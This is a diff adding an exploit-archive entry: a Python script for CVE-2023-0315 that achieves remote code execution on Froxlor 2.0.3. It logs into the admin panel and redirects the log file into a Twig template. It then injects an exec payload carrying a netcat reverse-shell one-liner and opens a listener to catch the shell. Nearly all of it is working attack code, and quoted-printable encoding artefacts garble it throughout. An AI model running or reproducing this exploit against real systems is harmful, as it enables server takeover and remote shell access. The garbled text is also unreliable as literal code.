@@ -1,0 +1,147 @@
+id: 38496
+date: 04/05/2023
+title: Froxlor 2.0.3 Stable - Remote Code Execution Exploit
+author: Askar
+cves: CVE-2023-0315
+
+#!/usr/bin/python3
+
+# Exploit Title: Froxlor 2.0.3 Stable - Remote Code Execution (RCE)
+# Date: 2023-01-08
+# Exploit Author: Askar (@mohammadaskar2)
+# CVE: CVE-2023-0315
+# Vendor Homepage: https://froxlor.org/
+# Version: v2.0.3
+# Tested on: Ubuntu 20.04 / PHP 8.2
+
+import telnetlib
+import requests
+import socket
+import sys
+import warnings
+import random
+import string
+from bs4 import BeautifulSoup
+from urllib.parse import quote
+from threading import Thread
+
+warnings.filterwarnings("ignore", category=3DUserWarning, module=3D'bs4')
+
+
+if len(sys.argv) !=3D 6:
+    print("[~] Usage : ./froxlor-rce.py url username password ip port")
+    exit()
+
+url =3D sys.argv[1]
+username =3D sys.argv[2]
+password =3D sys.argv[3]
+ip =3D sys.argv[4]
+port =3D sys.argv[5]
+
+request =3D requests.session()
+
+def login():
+    login_info =3D {
+    "loginname": username,
+    "password": password,
+    "send": "send",
+    "dologin": ""
+    }
+    login_request =3D request.post(url+"/index.php", login_info, allow_redi=
+rects=3DFalse)
+    login_headers =3D login_request.headers
+    location_header =3D login_headers["Location"]
+    if location_header =3D=3D "admin_index.php":
+        return True
+    else:
+        return False
+
+
+def change_log_path():
+    change_log_path_url =3D url + "/admin_settings.php?page=3Doverview&part=
+=3Dlogging"
+    csrf_token_req =3D request.get(change_log_path_url)
+    csrf_token_req_response =3D csrf_token_req.text
+    soup =3D BeautifulSoup(csrf_token_req_response, "lxml")
+    csrf_token =3D (soup.find("meta",  {"name":"csrf-token"})["content"])
+    print("[+] Main CSRF token retrieved %s" % csrf_token)
+
+    multipart_data =3D {
+
+        "logger_enabled": (None, "0"),
+        "logger_enabled": (None, "1"),
+        "logger_severity": (None, "2"),
+        "logger_logtypes[]": (None, "file"),
+        "logger_logfile": (None, "/var/www/html/froxlor/templates/Froxlor/f=
+ooter.html.twig"),
+        "logger_log_cron": (None, "0"),
+        "csrf_token": (None, csrf_token),
+        "page": (None, "overview"),
+        "action": (None, ""),
+        "send": (None, "send")
+   =20
+    }
+    req =3D request.post(change_log_path_url, files=3Dmultipart_data)
+    response =3D req.text
+    if "The settings have been successfully saved." in response:
+        print("[+] Changed log file path!")
+        return True
+    else:
+        return False
+
+
+def inject_template():
+    admin_page_path =3D url + "/admin_index.php"
+    csrf_token_req =3D request.get(admin_page_path)
+    csrf_token_req_response =3D csrf_token_req.text
+    soup =3D BeautifulSoup(csrf_token_req_response, "lxml")
+    csrf_token =3D (soup.find("meta",  {"name":"csrf-token"})["content"])
+    onliner =3D "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} =
+{1} >/tmp/f".format(ip, port)
+    payload =3D "{{['%s']|filter('exec')}}" % onliner
+    data =3D {
+        "theme": payload,
+        "csrf_token": csrf_token,
+        "page": "change_theme",
+        "send": "send",
+        "dosave": "",
+    }
+    req =3D request.post(admin_page_path, data, allow_redirects=3DFalse)
+    try:
+        location_header =3D req.headers["Location"]
+        if location_header =3D=3D "admin_index.php":
+            print("[+] Injected the payload sucessfully!")
+    except:
+        print("[-] Can't Inject payload :/")
+        exit()
+    handler_thread =3D Thread(target=3Dconnection_handler, args=3D(port,))
+    handler_thread.start()
+    print("[+] Triggering the payload ...")
+    req2 =3D request.get(admin_page_path)
+
+
+def connection_handler(port):
+    print("[+] Listener started on port %s" % port)
+    t =3D telnetlib.Telnet()
+    s =3D socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", int(port)))
+    s.listen(1)
+    conn, addr =3D s.accept()
+    print("[+] Connection received from %s" % addr[0])
+    t.sock =3D conn
+    print("[+] Heads up, incoming shell!!")
+    t.interact()
+
+
+
+if login():
+    print("[+] Successfully Logged in!")
+    index_url =3D url + "/admin_index.php"
+    request.get(index_url)
+    if change_log_path():
+        inject_template()
+
+else:
+    print("[-] Can't login")
+
+#  0day.today [2023-04-19]  #
